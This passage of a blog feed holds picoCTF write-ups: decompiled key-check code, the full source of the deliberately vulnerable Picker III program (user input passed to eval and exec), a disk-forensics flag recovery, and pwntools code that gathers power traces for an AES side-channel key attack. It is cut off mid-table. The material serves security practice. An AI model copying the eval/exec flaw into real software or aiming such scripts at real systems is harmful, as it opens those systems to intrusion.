&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( j &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; j &lt;span style="color:#f92672">&amp;lt;&lt;/span> i; &lt;span style="color:#f92672">++&lt;/span>j )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tmp_key[j] &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">0x61&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( i &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>strncmp(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tmp_key,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;bajbgfapbcclgoejgpakmdilalpomfdlkngkhaljlcpkjgndlgmpdgmnmepfikanepopbapfkdgleilhkfgilgabldofbcaedgfe&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">100uLL&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;You got the key, congrats! Now xor it with the flag!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34;Invalid key!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> printf(&lt;span style="color:#e6db74">&amp;#34;USAGE: %s [KEY]&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, &lt;span style="color:#f92672">*&lt;/span>argv);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Picker III</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---picker-iii/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---picker-iii/</guid><description>&lt;h1 id="picoctf---picker-iii">
 PicoCTF - Picker III
 &lt;a class="anchor" href="#picoctf---picker-iii">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!" data-lang="python!">
import re



USER_ALIVE = True
FUNC_TABLE_SIZE = 4
FUNC_TABLE_ENTRY_SIZE = 32
CORRUPT_MESSAGE = &amp;#39;Table corrupted. Try entering \&amp;#39;reset\&amp;#39; to fix it&amp;#39;

func_table = &amp;#39;&amp;#39;

def reset_table():
 global func_table

 # This table is formatted for easier viewing, but it is really one line
 func_table = \
&amp;#39;&amp;#39;&amp;#39;\
print_table \
read_variable \
write_variable \
getRandomNumber \
&amp;#39;&amp;#39;&amp;#39;

def check_table():
 global func_table

 if( len(func_table) != FUNC_TABLE_ENTRY_SIZE * FUNC_TABLE_SIZE):
 return False

 return True


def get_func(n):
 global func_table

 # Check table for viability
 if( not check_table() ):
 print(CORRUPT_MESSAGE)
 return

 # Get function name from table
 func_name = &amp;#39;&amp;#39;
 func_name_offset = n * FUNC_TABLE_ENTRY_SIZE
 for i in range(func_name_offset, func_name_offset+FUNC_TABLE_ENTRY_SIZE):
 if( func_table[i] == &amp;#39; &amp;#39;):
 func_name = func_table[func_name_offset:i]
 break

 if( func_name == &amp;#39;&amp;#39; ):
 func_name = func_table[func_name_offset:func_name_offset+FUNC_TABLE_ENTRY_SIZE]
 
 return func_name


def print_table():
 # Check table for viability
 if( not check_table() ):
 print(CORRUPT_MESSAGE)
 return

 for i in range(0, FUNC_TABLE_SIZE):
 j = i + 1
 print(str(j)+&amp;#39;: &amp;#39; + get_func(i))


def filter_var_name(var_name):
 r = re.search(&amp;#39;^[a-zA-Z_][a-zA-Z_0-9]*$&amp;#39;, var_name)
 if r:
 return True
 else:
 return False


def read_variable():
 var_name = input(&amp;#39;Please enter variable name to read: &amp;#39;)
 if( filter_var_name(var_name) ):
 eval(&amp;#39;print(&amp;#39;+var_name+&amp;#39;)&amp;#39;)
 else:
 print(&amp;#39;Illegal variable name&amp;#39;)


def filter_value(value):
 if &amp;#39;;&amp;#39; in value or &amp;#39;(&amp;#39; in value or &amp;#39;)&amp;#39; in value:
 return False
 else:
 return True


def write_variable():
 var_name = input(&amp;#39;Please enter variable name to write: &amp;#39;)
 if( filter_var_name(var_name) ):
 value = input(&amp;#39;Please enter new value of variable: &amp;#39;)
 if( filter_value(value) ):
 exec(&amp;#39;global &amp;#39;+var_name+&amp;#39;; &amp;#39;+var_name+&amp;#39; = &amp;#39;+value)
 else:
 print(&amp;#39;Illegal value&amp;#39;)
 else:
 print(&amp;#39;Illegal variable name&amp;#39;)


def call_func(n):
 &amp;#34;&amp;#34;&amp;#34;
 Calls the nth function in the function table.
 Arguments:
 n: The function to call. The first function is 0.
 &amp;#34;&amp;#34;&amp;#34;

 # Check table for viability
 if( not check_table() ):
 print(CORRUPT_MESSAGE)
 return

 # Check n
 if( n &amp;lt; 0 ):
 print(&amp;#39;n cannot be less than 0. Aborting...&amp;#39;)
 return
 elif( n &amp;gt;= FUNC_TABLE_SIZE ):
 print(&amp;#39;n cannot be greater than or equal to the function table size of &amp;#39;+FUNC_TABLE_SIZE)
 return

 # Get function name from table
 func_name = get_func(n)

 # Run the function
 eval(func_name+&amp;#39;()&amp;#39;)


def dummy_func1():
 print(&amp;#39;in dummy_func1&amp;#39;)

def dummy_func2():
 print(&amp;#39;in dummy_func2&amp;#39;)

def dummy_func3():
 print(&amp;#39;in dummy_func3&amp;#39;)

def dummy_func4():
 print(&amp;#39;in dummy_func4&amp;#39;)

def getRandomNumber():
 print(4) # Chosen by fair die roll.
 # Guaranteed to be random.
 # (See XKCD)

def win():
 # This line will not work locally unless you create your own &amp;#39;flag.txt&amp;#39; in
 # the same directory as this script
 flag = open(&amp;#39;flag.txt&amp;#39;, &amp;#39;r&amp;#39;).read()
 #flag = flag[:-1]
 flag = flag.strip()
 str_flag = &amp;#39;&amp;#39;
 for c in flag:
 str_flag += str(hex(ord(c))) + &amp;#39; &amp;#39;
 print(str_flag)

def help_text():
 print(
 &amp;#39;&amp;#39;&amp;#39;
This program fixes vulnerabilities in its predecessor by limiting what
functions can be called to a table of predefined functions. This still puts
the user in charge, but prevents them from calling undesirable subroutines.

* Enter &amp;#39;quit&amp;#39; to quit the program.
* Enter &amp;#39;help&amp;#39; for this text.
* Enter &amp;#39;reset&amp;#39; to reset the table.
* Enter &amp;#39;1&amp;#39; to execute the first function in the table.
* Enter &amp;#39;2&amp;#39; to execute the second function in the table.
* Enter &amp;#39;3&amp;#39; to execute the third function in the table.
* Enter &amp;#39;4&amp;#39; to execute the fourth function in the table.

Here&amp;#39;s the current table:
 &amp;#39;&amp;#39;&amp;#39;
 )
 print_table()



reset_table()

while(USER_ALIVE):
 choice = input(&amp;#39;==&amp;gt; &amp;#39;)
 if( choice == &amp;#39;quit&amp;#39; or choice == &amp;#39;exit&amp;#39; or choice == &amp;#39;q&amp;#39; ):
 USER_ALIVE = False
 elif( choice == &amp;#39;help&amp;#39; or choice == &amp;#39;?&amp;#39; ):
 help_text()
 elif( choice == &amp;#39;reset&amp;#39; ):
 reset_table()
 elif( choice == &amp;#39;1&amp;#39; ):
 call_func(0)
 elif( choice == &amp;#39;2&amp;#39; ):
 call_func(1)
 elif( choice == &amp;#39;3&amp;#39; ):
 call_func(2)
 elif( choice == &amp;#39;4&amp;#39; ):
 call_func(3)
 else:
 print(&amp;#39;Did not understand &amp;#34;&amp;#39;+choice+&amp;#39;&amp;#34; Have you tried &amp;#34;help&amp;#34;?&amp;#39;)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Pitter, Patter, Platters</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/disk/picoctf---pitter-patter-platters/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/disk/picoctf---pitter-patter-platters/</guid><description>&lt;h1 id="picoctf---pitter-patter-platters">
 PicoCTF - Pitter, Patter, Platters
 &lt;a class="anchor" href="#picoctf---pitter-patter-platters">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-misc">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://play.picoctf.org/practice/challenge/87?category=4&amp;amp;page=2">Pitter, Patter, Platters&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.gtwang.org/linux/linux-add-format-mount-harddisk/">sda&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;h2 id="exploit---use-ftk-imager">
 Exploit - Use FTK Imager
 &lt;a class="anchor" href="#exploit---use-ftk-imager">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>I use Autopsy but find nothing except a txt file
&lt;img src="https://i.imgur.com/7IXjuMn.png" alt="" />
So I follow &lt;a href="https://youtu.be/P0wvFs02oKY">write up video&lt;/a> to use &lt;code>FTK imager&lt;/code> and it can parse files completely.
&lt;img src="https://i.imgur.com/FdC9k3V.png" alt="" />&lt;/li>
&lt;/ul>
&lt;p>ORRRR&amp;hellip;&lt;/p>
&lt;ul>
&lt;li>Use &lt;code>HxD&lt;/code> as auxiliary tool to find flag
&lt;img src="https://i.imgur.com/RTIOn1G.png" alt="" />&lt;/li>
&lt;/ul>
&lt;p>ORRRR&amp;hellip;&lt;/p>
&lt;ul>
&lt;li>Just use string search
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ strings -e l Pitter,\ Patter,\ Platters.sda1 | rev
picoCTF{b3_5t111_mL|_&amp;lt;3_ba880921}
...
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://github.com/Dvd848/CTFs/blob/master/2020_picoCTF_Mini/Pitter_Patter_Platters.md">Pitter, Patter, Platters write up&lt;/a>
&lt;a href="https://youtu.be/P0wvFs02oKY">pico 2020 mini pitter patter platters&lt;/a>&lt;/p></description></item><item><title>PicoCTF - PowerAnalysis Part 1 / Part 2</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/sidechannel/picoctf---poweranalysis-part-1-_-part-2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/sidechannel/picoctf---poweranalysis-part-1-_-part-2/</guid><description>&lt;h1 id="picoctf---poweranalysis-part-1--part-2">
 PicoCTF - PowerAnalysis Part 1 / Part 2
 &lt;a class="anchor" href="#picoctf---poweranalysis-part-1--part-2">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@SBK6401/HJNScTc-T">Simple Welcome 0x13(2023 HW - Power Analysis):two:&lt;/a>&lt;/p>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題幾乎就和上課教的差不多，只是因為有雜訊，所以要慎選trace point，我是直接看第一個trace的分布，決定採用300~400的point，而不管是利用自己刻的correlation coefficient還是用scipy的pearsonr都一樣可以順利解出key但是如果像homework一樣用numpy的corrcoef會有兩個bytes和正解不一樣，超哭，找超久(10/18更新，如果用自己刻的也是要碰用氣，所以如果可以的話，多送幾個trace，或者多用幾個算correlation coefficient的library)
&lt;img src="https://hackmd.io/_uploads/SJ4YLRnZT.jpg" alt="" />&lt;/p>
&lt;ul>
&lt;li>Part 2的部分幾乎一模一樣，就只是他先幫你紀錄好所有的trace，再讓我們做後續的分析&lt;/li>
&lt;/ul>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>首先先把資料從server拉下來，在存成json
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> string &lt;span style="color:#f92672">import&lt;/span> ascii_letters, digits
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> json
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> tqdm &lt;span style="color:#f92672">import&lt;/span> trange
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">gen_plaintext&lt;/span>(length):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(random&lt;span style="color:#f92672">.&lt;/span>choice(ascii_letters &lt;span style="color:#f92672">+&lt;/span> digits) &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(length))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>pt &lt;span style="color:#f92672">=&lt;/span> [gen_plaintext(&lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">50&lt;/span>)]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(pt)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>json_file &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#66d9ef">None&lt;/span>] &lt;span style="color:#f92672">*&lt;/span> len(pt)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> trange(len(pt)):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r &lt;span style="color:#f92672">=&lt;/span> remote(&lt;span style="color:#e6db74">&amp;#39;saturn.picoctf.net&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">52339&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r&lt;span style="color:#f92672">.&lt;/span>sendlineafter(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;hex: &amp;#39;&lt;/span>, pt[i]&lt;span style="color:#f92672">.&lt;/span>encode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>hex()&lt;span style="color:#f92672">.&lt;/span>encode())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r&lt;span style="color:#f92672">.&lt;/span>recvuntil(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;power measurement result: &amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pm &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>recvline()&lt;span style="color:#f92672">.&lt;/span>decode()&lt;span style="color:#f92672">.&lt;/span>strip()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> json_file[i] &lt;span style="color:#f92672">=&lt;/span> {}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> json_file[i][&lt;span style="color:#e6db74">&amp;#34;pt&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> [ord(digit) &lt;span style="color:#66d9ef">for&lt;/span> digit &lt;span style="color:#f92672">in&lt;/span> pt[i]]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> json_file[i][&lt;span style="color:#e6db74">&amp;#34;pm&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> pm
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> r&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>json_object &lt;span style="color:#f92672">=&lt;/span> json&lt;span style="color:#f92672">.&lt;/span>dumps(json_file)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;./Crypto/PowerAnalysis- Part 1/trace.json&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;w&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> outfile:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> outfile&lt;span style="color:#f92672">.&lt;/span>write(json_object)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>然後再去解析AES key
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> json
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> tqdm &lt;span style="color:#f92672">import&lt;/span> trange
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> numpy &lt;span style="color:#66d9ef">as&lt;/span> np
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> copy
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> string &lt;span style="color:#f92672">import&lt;/span> ascii_letters, digits
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> numpy &lt;span style="color:#f92672">import&lt;/span> corrcoef
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> matplotlib.pyplot &lt;span style="color:#66d9ef">as&lt;/span> plt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> scipy.stats &lt;span style="color:#f92672">import&lt;/span> pearsonr
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>jsonFile &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;./PicoCTF/Crypto/PowerAnalysis- Part 1/trace.json&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>j &lt;span style="color:#f92672">=&lt;/span> json&lt;span style="color:#f92672">.&lt;/span>load(jsonFile)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>s_box &lt;span style="color:#f92672">=&lt;/span> [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0x63&lt;/span>, &lt;span style="color:#ae81ff">0x7C&lt;/span>, &lt;span style="color:#ae81ff">0x77&lt;/span>, &lt;span style="color:#ae81ff">0x7B&lt;/span>, &lt;span style="color:#ae81ff">0xF2&lt;/span>, &lt;span style="color:#ae81ff">0x6B&lt;/span>, &lt;span style="color:#ae81ff">0x6F&lt;/span>, &lt;span style="color:#ae81ff">0xC5&lt;/span>, &lt;span style="color:#ae81ff">0x30&lt;/span>, &lt;span style="color:#ae81ff">0x01&lt;/span>, &lt;span style="color:#ae81ff">0x67&lt;/span>, &lt;span style="color:#ae81ff">0x2B&lt;/span>, &lt;span style="color:#ae81ff">0xFE&lt;/span>, &lt;span style="color:#ae81ff">0xD7&lt;/span>, &lt;span style="color:#ae81ff">0xAB&lt;/span>, &lt;span style="color:#ae81ff">0x76&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0xCA&lt;/span>, &lt;span style="color:#ae81ff">0x82&lt;/span>, &lt;span style="color:#ae81ff">0xC9&lt;/span>, &lt;span style="color:#ae81ff">0x7D&lt;/span>, &lt;span style="color:#ae81ff">0xFA&lt;/span>, &lt;span style="color:#ae81ff">0x59&lt;/span>, &lt;span style="color:#ae81ff">0x47&lt;/span>, &lt;span style="color:#ae81ff">0xF0&lt;/span>, &lt;span style="color:#ae81ff">0xAD&lt;/span>, &lt;span style="color:#ae81ff">0xD4&lt;/span>, &lt;span style="color:#ae81ff">0xA2&lt;/span>, &lt;span style="color:#ae81ff">0xAF&lt;/span>, &lt;span style="color:#ae81ff">0x9C&lt;/span>, &lt;span style="color:#ae81ff">0xA4&lt;/span>, &lt;span style="color:#ae81ff">0x72&lt;/span>, &lt;span style="color:#ae81ff">0xC0&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0xB7&lt;/span>, &lt;span style="color:#ae81ff">0xFD&lt;/span>, &lt;span style="color:#ae81ff">0x93&lt;/span>, &lt;span style="color:#ae81ff">0x26&lt;/span>, &lt;span style="color:#ae81ff">0x36&lt;/span>, &lt;span style="color:#ae81ff">0x3F&lt;/span>, &lt;span style="color:#ae81ff">0xF7&lt;/span>, &lt;span style="color:#ae81ff">0xCC&lt;/span>, &lt;span style="color:#ae81ff">0x34&lt;/span>, &lt;span style="color:#ae81ff">0xA5&lt;/span>, &lt;span style="color:#ae81ff">0xE5&lt;/span>, &lt;span style="color:#ae81ff">0xF1&lt;/span>, &lt;span style="color:#ae81ff">0x71&lt;/span>, &lt;span style="color:#ae81ff">0xD8&lt;/span>, &lt;span style="color:#ae81ff">0x31&lt;/span>, &lt;span style="color:#ae81ff">0x15&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0x04&lt;/span>, &lt;span style="color:#ae81ff">0xC7&lt;/span>, &lt;span style="color:#ae81ff">0x23&lt;/span>, &lt;span style="color:#ae81ff">0xC3&lt;/span>, &lt;span style="color:#ae81ff">0x18&lt;/span>, &lt;span style="color:#ae81ff">0x96&lt;/span>, &lt;span style="color:#ae81ff">0x05&lt;/span>, &lt;span style="color:#ae81ff">0x9A&lt;/span>, &lt;span style="color:#ae81ff">0x07&lt;/span>, &lt;span style="color:#ae81ff">0x12&lt;/span>, &lt;span style="color:#ae81ff">0x80&lt;/span>, &lt;span style="color:#ae81ff">0xE2&lt;/span>, &lt;span style="color:#ae81ff">0xEB&lt;/span>, &lt;span style="color:#ae81ff">0x27&lt;/span>, &lt;span style="color:#ae81ff">0xB2&lt;/span>, &lt;span style="color:#ae81ff">0x75&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0x09&lt;/span>, &lt;span style="color:#ae81ff">0x83&lt;/span>, &lt;span style="color:#ae81ff">0x2C&lt;/span>, &lt;span style="color:#ae81ff">0x1A&lt;/span>, &lt;span style="color:#ae81ff">0x1B&lt;/span>, &lt;span style="color:#ae81ff">0x6E&lt;/span>, &lt;span style="color:#ae81ff">0x5A&lt;/span>, &lt;span style="color:#ae81ff">0xA0&lt;/span>, &lt;span style="color:#ae81ff">0x52&lt;/span>, &lt;span style="color:#ae81ff">0x3B&lt;/span>, &lt;span style="color:#ae81ff">0xD6&lt;/span>, &lt;span style="color:#ae81ff">0xB3&lt;/span>, &lt;span style="color:#ae81ff">0x29&lt;/span>, &lt;span style="color:#ae81ff">0xE3&lt;/span>, &lt;span style="color:#ae81ff">0x2F&lt;/span>, &lt;span style="color:#ae81ff">0x84&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0x53&lt;/span>, &lt;span style="color:#ae81ff">0xD1&lt;/span>, &lt;span style="color:#ae81ff">0x00&lt;/span>, &lt;span style="color:#ae81ff">0xED&lt;/span>, &lt;span style="color:#ae81ff">0x20&lt;/span>, &lt;span style="color:#ae81ff">0xFC&lt;/span>, &lt;span style="color:#ae81ff">0xB1&lt;/span>, &lt;span style="color:#ae81ff">0x5B&lt;/span>, &lt;span style="color:#ae81ff">0x6A&lt;/span>, &lt;span style="color:#ae81ff">0xCB&lt;/span>, &lt;span style="color:#ae81ff">0xBE&lt;/span>, &lt;span style="color:#ae81ff">0x39&lt;/span>, &lt;span style="color:#ae81ff">0x4A&lt;/span>, &lt;span style="color:#ae81ff">0x4C&lt;/span>, &lt;span style="color:#ae81ff">0x58&lt;/span>, &lt;span style="color:#ae81ff">0xCF&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0xD0&lt;/span>, &lt;span style="color:#ae81ff">0xEF&lt;/span>, &lt;span style="color:#ae81ff">0xAA&lt;/span>, &lt;span style="color:#ae81ff">0xFB&lt;/span>, &lt;span style="color:#ae81ff">0x43&lt;/span>, &lt;span style="color:#ae81ff">0x4D&lt;/span>, &lt;span style="color:#ae81ff">0x33&lt;/span>, &lt;span style="color:#ae81ff">0x85&lt;/span>, &lt;span style="color:#ae81ff">0x45&lt;/span>, &lt;span style="color:#ae81ff">0xF9&lt;/span>, &lt;span style="color:#ae81ff">0x02&lt;/span>, &lt;span style="color:#ae81ff">0x7F&lt;/span>, &lt;span style="color:#ae81ff">0x50&lt;/span>, &lt;span style="color:#ae81ff">0x3C&lt;/span>, &lt;span style="color:#ae81ff">0x9F&lt;/span>, &lt;span style="color:#ae81ff">0xA8&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">0x51&lt;/span>, &lt;span style="color:#ae81ff">0xA3&lt;/span>, &lt;span style="color:#ae81ff">0x40&lt;/span>, &lt;span style="color:#ae81ff">0x8F&lt;/span>, &lt;span style="color:#ae81ff">0x92&lt;/span>, &lt;span style="color:#ae81ff">0x9D&lt;/span>, &lt;span style="color:#ae81ff">0x38&lt;/span>, &lt;span style="color:#ae81ff">0xF5&lt;/span>, &lt;span style="color:#ae81ff">0xBC&lt;/span>, &lt;span style="color:#ae81ff">0xB6&lt;/span>, &lt;span style="color:#ae81ff">0xDA&lt;/span>, &lt;span style="color:#ae81ff">0x21&lt;/span>, &lt;span style="color:#ae81ff">0x10&lt;/span>, &lt;span style="color:#ae81ff">0xFF&lt;/span>, &lt;span style="color:#ae81ff">0xF3&lt;/span>, &lt;span style="color:#ae81ff">0xD2&lt;/span>],
